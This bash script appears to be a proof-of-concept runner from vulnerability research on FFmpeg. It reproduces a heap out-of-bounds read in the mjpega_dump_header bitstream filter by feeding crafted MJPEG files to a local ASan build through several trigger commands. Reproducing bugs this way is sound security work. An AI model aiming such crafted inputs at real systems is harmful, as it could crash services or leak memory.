#!/bin/bash
# PoC runner for VULN 002: Heap OOB Read in libavcodec/bsf/mjpega_dump_header.c
# Line 83: guard `i + 8 < in->size` passes but AV_RL32 reads 4 bytes from i+8 (OOB)

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

if [ ! -x "$BIN" ]; then
    echo "ERROR: ffmpeg binary not found at $BIN"
    exit 1
fi

echo "=== Generating crafted MJPEG files ==="
python3 vuln_002_gen.py

echo ""
echo "=== ffmpeg version ==="
"$BIN" -version 2>&1 | head -3 || true

ASAN_BASE="abort_on_error=0:detect_leaks=0"

run_cmd() {
    local label="$1"
    shift
    echo ""
    echo "--- [$label] $* ---"
    ASAN_OPTIONS="${ASAN_BASE}:log_path=./asan_002_${label}.log" \
        "$@" 2>&1 || true
    if ls "asan_002_${label}.log."* 2>/dev/null | grep -q .; then
        echo "[ASAN output for $label]"
        cat "asan_002_${label}.log."* 2>/dev/null || true
    fi
}

# Approach A: -c:v copy puts BSF on output side, processing raw MJPEG packets
# Two-frame file: valid frame for probing, malformed frame triggers OOB
echo ""
echo "=== Approach A: output BSF with -c:v copy (two-frame file) ==="
run_cmd "A1_copy" "$BIN" -f mjpeg -i vuln_002_input.mjpeg \
    -c:v copy -bsf:v mjpegadump -f null -

run_cmd "A2_copy_app0" "$BIN" -f mjpeg -i vuln_002_input_app0.mjpeg \
    -c:v copy -bsf:v mjpegadump -f null -

# Approach B: original trigger command as specified in the vuln report
echo ""
echo "=== Approach B: original trigger (default transcode) ==="
run_cmd "B1_orig" "$BIN" -f mjpeg -i vuln_002_input.mjpeg \
    -bsf:v mjpegadump -f null -

# Approach C: input BSF (BSF runs before decoder, on raw demuxed packets)
echo ""
echo "=== Approach C: input BSF (before -i) ==="
run_cmd "C1_input_bsf" "$BIN" -f mjpeg -bsf:v mjpegadump \
    -i vuln_002_input_single.mjpeg -f null -

run_cmd "C2_input_bsf_twofr" "$BIN" -f mjpeg -bsf:v mjpegadump \
    -i vuln_002_input.mjpeg -f null -

# Approach D: force codec params via command line to bypass probing
echo ""
echo "=== Approach D: force codec params + copy ==="
run_cmd "D1_forced" "$BIN" -f mjpeg \
    -i vuln_002_input_single.mjpeg \
    -c:v copy -bsf:v mjpegadump -f null - 2>&1 || true

# Approach E: AVI container wrapping MJPEG
# (ffmpeg can create an AVI with MJPEG codec from raw MJPEG)
echo ""
echo "=== Approach E: wrap in AVI container first, then run BSF ==="
# Step 1: create a valid AVI from the valid JPEG (ignore errors)
"$BIN" -y -f mjpeg -i vuln_002_input.mjpeg -c:v copy -f avi vuln_002_valid.avi 2>/dev/null || true
if [ -f vuln_002_valid.avi ]; then
    run_cmd "E1_avi" "$BIN" -i vuln_002_valid.avi \
        -c:v copy -bsf:v mjpegadump -f null -
fi

echo ""
echo "=== Summary of ASAN logs ==="
for f in asan_002_*.log.*; do
    [ -f "$f" ] && { echo "=== $f ==="; cat "$f"; } || true
done

echo ""
echo "=== Done ==="
